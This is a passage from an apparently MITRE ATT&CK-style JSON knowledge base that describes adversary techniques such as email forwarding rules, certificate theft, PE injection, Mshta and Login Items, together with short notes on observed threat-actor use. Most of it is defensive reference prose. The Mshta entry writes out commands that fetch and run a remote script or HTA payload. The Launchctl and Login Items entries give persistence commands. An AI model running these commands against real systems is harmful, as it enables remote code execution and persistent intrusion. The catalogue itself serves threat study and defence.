    "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victims organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ",
    "similar_words": [
      "Email Forwarding Rule"
    ],
    "id": "T1114.003"
  },
  "attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331": {
    "name": "Steal or Forge Authentication Certificates",
    "example_uses": [
      "can create and export various authentication certificates including those associated with Azure AD joined/registered devices.",
      "has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.",
      "`CRYPTO` module can create and export various types of authentication certificates."
    ],
    "description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificates extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificates subject alternative name (SAN) values define the certificate owners alternate names.(Citation: Medium Certified Pre Owned)Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as golden certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)",
    "similar_words": [
      "Steal or Forge Authentication Certificates"
    ],
    "id": "T1649"
  },
  "attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215": {
    "name": "Device Registration",
    "example_uses": [
      "has enrolled their own devices into compromised cloud tenants including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.",
      "can register a device to Azure AD.",
      "During the   registered devices in order to enable mailbox syncing via the `Set-CASMailbox` command.",
      "During   registered devices for MFA to maintain persistence through victims' VPN."
    ],
    "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a users credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)Similarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) Devices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",
    "similar_words": [
      "Device Registration"
    ],
    "id": "T1098.005"
  },
  "attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9": {
    "name": "Compromise Infrastructure",
    "example_uses": [
      "included the use of compromised infrastructure such as DVR and IP camera devices for command and control purposes in  activity.",
      "During   compromised third-party infrastructure in physical proximity to targets of interest for follow-on activities."
    ],
    "description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Adversaries may also compromise numerous machines to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services or to form a botnet.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking) Additionally, adversaries may compromise infrastructure residing in close proximity to a target in order to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) via [Wi-Fi Networks](https://attack.mitre.org/techniques/T1669).(Citation: Nearest Neighbor Volexity)By using compromised infrastructure, adversaries may enable follow-on malicious operations. Prior to targeting, adversaries may also compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",
    "similar_words": [
      "Compromise Infrastructure"
    ],
    "id": "T1584"
  },
  "attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961": {
    "name": "Mark-of-the-Web Bypass",
    "example_uses": [
      "has used .iso files to deploy malicious .lnk files.",
      "has modified the `:Zone.Identifier` in the ADS area to zero.",
      "has been packaged in ISO files in order to bypass Mark of the Web (MOTW) security measures.",
      "has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web.",
      "has used ISO and VHD files to deploy malware and to bypass Mark-of-the-Web (MOTW) security measures."
    ],
    "description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",
    "similar_words": [
      "Mark-of-the-Web Bypass"
    ],
    "id": "T1553.005"
  },
  "attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5": {
    "name": "Disable Crypto Hardware",
    "example_uses": [],
    "description": "Adversaries disable a network devices dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",
    "similar_words": [
      "Disable Crypto Hardware"
    ],
    "id": "T1600.002"
  },
  "attack-pattern--7f0ca133-88c4-40c6-a62f-b3083a7fbc2e": {
    "name": "Pre-OS Boot",
    "example_uses": [],
    "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
    "similar_words": [
      "Pre-OS Boot"
    ],
    "id": "T1542"
  },
  "attack-pattern--800f9819-7007-4540-a520-40e655876800": {
    "name": "Build Image on Host",
    "example_uses": [],
    "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since its a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ",
    "similar_words": [
      "Build Image on Host"
    ],
    "id": "T1612"
  },
  "attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662": {
    "name": "Portable Executable Injection",
    "example_uses": [
      "can inject its backdoor as a portable executable into a target process.",
      "downloads an executable and injects it directly into a new process.",
      "miner TermsHost.exe evaded defenses by injecting itself into Windows processes including Notepad.exe.",
      "malware can download a remote access tool  and inject into another process.",
      "can execute PE files in the address space of the specified process.",
      "has a module to inject a PE binary into a remote process.",
      "checks processes on the system and if they meet the necessary requirements it injects into that process.",
      "has injected  into the Explorer.exe process on comrpomised hosts.",
      "can use its own PE loader to execute payloads in memory.",
      "can inject its decrypted payload into another process.",
      "following payload decryption creates a process hard-coded into the dropped (e.g. WerFault.exe) and injects the decrypted core modules into it."
    ],
    "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Portable Executable Injection"
    ],
    "id": "T1055.002"
  },
  "attack-pattern--808e6329-ca91-4b87-ac2d-8eadc5f8f327": {
    "name": "Verclsid",
    "example_uses": [
      "has used verclsid.exe to download and execute a malicious script."
    ],
    "description": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) ",
    "similar_words": [
      "Verclsid"
    ],
    "id": "T1218.012"
  },
  "attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a": {
    "name": "Compromise Accounts",
    "example_uses": [],
    "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
    "similar_words": [
      "Compromise Accounts"
    ],
    "id": "T1586"
  },
  "attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d": {
    "name": "Launchctl",
    "example_uses": [
      "launched the QEMU services in the /Library/LaunchDaemons/ folder using launchctl. It also uses launchctl to unload all s when updating to a newer version of .",
      "has loaded a plist file using the launchctl command.",
      "has used `launchctl` to restart the .",
      "loads a system level launchdaemon using the launchctl load -w command from /System/Librarby/LaunchDaemons/ssh.plist.",
      "uses launchctl to enable screen sharing on the victims machine.",
      "can use `launchctl` to load a LaunchAgent for persistence."
    ],
    "description": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: launchctl load,launchctl unload, and launchctl start. Adversaries can use scripts or manually run the commands launchctl load -w \"%s/Library/LaunchAgents/%s\" or /bin/launchctl load to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)",
    "similar_words": [
      "Launchctl"
    ],
    "id": "T1569.001"
  },
  "attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3": {
    "name": "Botnet",
    "example_uses": [
      "has used large groups of compromised machines for use as proxy nodes.",
      "has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices.",
      "Volt Typhoon has used compromised Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support operations.",
      "has used compromised devices in covert networks to obfuscate communications."
    ],
    "description": "Adversaries may compromise numerous third-party systems to form a botnetthat can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",
    "similar_words": [
      "Botnet"
    ],
    "id": "T1584.005"
  },
  "attack-pattern--818302b2-d640-477b-bf88-873120ce85c4": {
    "name": "Network Device CLI",
    "example_uses": [
      "can execute native commands in networking device command line interfaces."
    ],
    "description": "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)",
    "similar_words": [
      "Network Device CLI"
    ],
    "id": "T1059.008"
  },
  "attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3": {
    "name": "Bash History",
    "example_uses": [
      "has searched bash_history for credentials."
    ],
    "description": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the users .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the users last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",
    "similar_words": [
      "Bash History"
    ],
    "id": "T1552.003"
  },
  "attack-pattern--824add00-99a1-4b15-9a2d-6c5683b7b497": {
    "name": "Downgrade Attack",
    "example_uses": [
      "can downgrade NTLM to capture NTLM hashes.",
      "During  the adversary downgraded firmware on victim devices in order to impair visibility into the process environment.",
      "enables SMBv1 during execution."
    ],
    "description": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a systems backward compatibility to force it into less secure modes of operation. Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade) On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.(Citation: SafeBreach)",
    "similar_words": [
      "Downgrade Attack"
    ],
    "id": "T1562.010"
  },
  "attack-pattern--8252f135-ed26-4ce1-ae61-f26e94429a19": {
    "name": "XPC Services",
    "example_uses": [],
    "description": "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service C API or the high level NSXPCConnection API in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
    "similar_words": [
      "XPC Services"
    ],
    "id": "T1559.003"
  },
  "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc": {
    "name": "Credentials In Files",
    "example_uses": [
      "is capable of accessing locally stored passwords on victims.",
      "can use Lazagne for harvesting credentials.",
      "has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user.",
      "contains modules for searching for passwords in local and remote files.",
      "searches for files named logins.json to parse for credentials.",
      "has used a variety of publicly available tools like  to gather credentials.",
      "has the ability to extract credentials from configuration or support files.",
      "can obtain credentials from chats databases mail and WiFi.",
      "can use various modules to search for files containing passwords.",
      "can steal credentials in files belonging to common software such as Skype Telegram and Steam.",
      "has extracted credentials from the password database before encrypting the files.",
      "has accessed files to gain valid credentials.",
      "has searched for SSH keys Docker credentials and Kubernetes service tokens.",
      "has used malware to gather credentials from FTP clients and Outlook.",
      "can obtain passwords stored in files from several applications such as Outlook Filezilla OpenSSH OpenVPN and WinSCP. Additionally it searches for the .vnc.lnk affix to steal VNC credentials.",
      "can gather unsecured credentials for Azure AD services such as Azure AD Connect from a local machine.",
      "has obtained administrative credentials by browsing through local files on a compromised machine.",
      "has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.",
      "used several tools for retrieving login and password information including LaZagne.",
      "can obtain passwords from FTP clients.",
      "If an initial connectivity check fails  attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.",
      "has used tools that are capable of obtaining credentials from saved mail.",
      "has used a plug-in to gather credentials stored in files on the host by various software programs including The Bat! email client Outlook and Windows Credential Store.",
      "can capture passwords from common chat applications such as MSN Messenger AOL Instant Messenger and and Google Talk.",
      "has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
      "has searched for unsecured AWS credentials and Docker API credentials.",
      "has run a tool that steals passwords saved in victim email.",
      "Spider searches for credential storage documentation on a compromised host.",
      "has searched files to obtain and exfiltrate credentials.",
      "used  to obtain passwords in files.",
      "has dumped configuration settings in accessed IP cameras including plaintext credentials.",
      "gathered credentials stored in files related to Building Management System (BMS) operations during .",
      "searches for and if found collects the contents of files such as `logins.json` and `key4.db` in the `$APPDATA%\\Thunderbird\\Profiles\\` directory associated with the Thunderbird email application."
    ],
    "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
    "similar_words": [
      "Credentials In Files"
    ],
    "id": "T1552.001"
  },
  "attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1": {
    "name": "DNS Calculation",
    "example_uses": [
      "has used multiple variants of  including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port."
    ],
    "description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)",
    "similar_words": [
      "DNS Calculation"
    ],
    "id": "T1568.003"
  },
  "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade": {
    "name": "Mshta",
    "example_uses": [
      "has used mshta.exe to execute malicious payloads.",
      "has used mshta.exe to execute HTML pages downloaded by initial access documents.",
      "can use mshta to serve additional payloads and to help schedule tasks for persistence.",
      "has used mshta.exe to execute its  payload and to pass a PowerShell one-liner for execution.",
      "can use mshta for executing scripts.",
      "has used mshta.exe to launch collection scripts.",
      "has used mshta.exe to download and execute applications from a remote server.",
      "has used `mshta.exe` to execute  stagers.",
      "can use Mshta.exe to execute additional payloads on compromised hosts.",
      "has used `mshta` to execute scripts including VBS.",
      "has used mshta.exe to execute a HTA payload.",
      "has used malicious HTA files to drop and execute malware.",
      "has used mshta.exe to run malicious scripts on the system.",
      "has used mshta.exe to execute VBScript to execute malicious code on victim systems.",
      "uses mshta.exe to run malicious scripts on the system.",
      "has used `mshta.exe` to load an HTA script within a malicious .LNK file.",
      "has used mshta.exe for code execution.",
      "uses mshta.exe to load its program and files.",
      "has been executed via MSHTA application.",
      "During  the threat actors executed JavaScript code via `mshta.exe`.",
      "has use `mshta` to execute malicious scripts on a compromised host.",
      "has used mshta.exe to execute malicious VBScript.",
      "can use mshta.exe to execute an HTA file hosted on a remote server.",
      "has used mshta.exe to execute malicious payloads.",
      "has utilized `mshta.exe` to execute a malicious hta file.",
      "has used `mshta.exe` to execute malicious HTA files.",
      "During  the threat actors used `mshta` to execute DLLs.",
      "can create HTA files to install Grunt listeners.",
      "has used `mshta.exe` to execute malicious files.",
      "has used mshta.exe to execute additional content.",
      "has used a renamed version of `mshta.exe` to execute malicious HTML files."
    ],
    "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
    "similar_words": [
      "Mshta"
    ],
    "id": "T1218.005"
  },
  "attack-pattern--84601337-6a55-4ad7-9c35-79e0d1ea2ab3": {
    "name": "Login Items",
    "example_uses": [
      "can add  to establish persistence.",
      "can persist via startup options for Login items.",
      "uses AppleScript to install a login Item by sending Apple events to the System Events process."
    ],
    "description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.Login items installed using the Service Management Framework leverage launchd, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the System Events process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as tell application System Events to make login item at end with properties /path/to/executable.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in ~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac 